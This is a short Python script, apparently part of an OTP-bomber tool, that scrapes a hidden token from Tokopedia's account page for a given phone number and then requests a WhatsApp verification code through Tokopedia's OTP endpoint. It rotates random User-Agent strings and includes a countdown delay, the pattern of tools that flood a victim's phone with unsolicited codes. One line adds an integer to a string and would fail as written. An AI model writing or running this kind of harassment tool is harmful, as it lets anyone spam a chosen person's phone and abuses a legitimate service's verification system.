from requests import ConnectionError
from time import sleep
import requests,random,json,time,sys,os,re

def dark_mulai():
    for x in range(15):
                                print(end=f"\rMemulai {15-(x+1)}s  ",flush=True)
                                time.sleep(1)
def dark_tok(nom):
                rands=random.choice(open('darky.txt').readlines()).split('\n')[0]
                kirim = {
                        'User-Agent' : rands,
                        'Accept-Encoding' : 'gzip, deflate',
                        'Connection' : 'keep-alive',
                        'Origin' : 'https://accounts.tokopedia.com',
                        'Accept' : 'application/json, text/javascript, */*; q=0.01',
                        'X-Requested-With' : 'XMLHttpRequest',
                        'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
                }
                regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+0+nom+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = kirim).text
                Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
                formulir = {
                        "otp_type" : "116",
                        "msisdn" : nom,
                        "tk" : Token,
                        "email" : '',
                        "original_param" : "",
                        "user_id" : "",
                        "signature" : "",
                        "number_otp_digit" : "6"
                }
                req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
